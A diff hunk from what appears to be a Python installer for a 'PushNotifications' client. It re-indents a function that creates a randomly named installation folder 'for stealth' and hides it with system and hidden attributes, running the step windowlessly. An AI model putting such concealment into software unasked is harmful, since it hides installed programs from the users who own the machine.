@@ -3174,28 +3174,28 @@ powershell -Command "Start-Process -FilePath '{sys.executable}' -ArgumentList '{
         except Exception as e:
             logger.error(f"Failed to create desktop shortcuts: {e}")
             return False
-def create_installation_directory(self):
-    """Create secure, hidden installation directory"""
-    if self.install_path:
-        return True
-    print("Creating hidden installation directory...")
-    try:
-        # Generate a random UUID-based path for stealth
-        random_path = f"PushNotifications_{uuid.uuid4().hex[:8]}"
-        base_path = Path(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'))
-        install_path = base_path / random_path
-        # Create installation directory
-        install_path.mkdir(parents=True, exist_ok=True)
-        # Hide directory and set system attributes
-        subprocess.run([
-            "attrib", "+S", "+H", str(install_path)
-        ], check=False, creationflags=subprocess.CREATE_NO_WINDOW)
-        self.install_path = install_path
-        print(f"[OK] Created hidden installation directory: {install_path}")
-        return True
-    except Exception as e:
-        print(f"[ERR] Failed to create installation directory: {e}")
-        return False
+    def create_installation_directory(self):
+        """Create secure, hidden installation directory"""
+        if self.install_path:
+            return True
+        print("Creating hidden installation directory...")
+        try:
+            # Generate a random UUID-based path for stealth
+            random_path = f"PushNotifications_{uuid.uuid4().hex[:8]}"
+            base_path = Path(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'))
+            install_path = base_path / random_path
+            # Create installation directory
+            install_path.mkdir(parents=True, exist_ok=True)
+            # Hide directory and set system attributes
+            subprocess.run([
+                "attrib", "+S", "+H", str(install_path)
+            ], check=False, creationflags=subprocess.CREATE_NO_WINDOW)
+            self.install_path = install_path
+            print(f"[OK] Created hidden installation directory: {install_path}")
+            return True
+        except Exception as e:
+            print(f"[ERR] Failed to create installation directory: {e}")
+            return False
 def create_client_script(self):
     """Create the Python client script in the installation directory"""
     try:
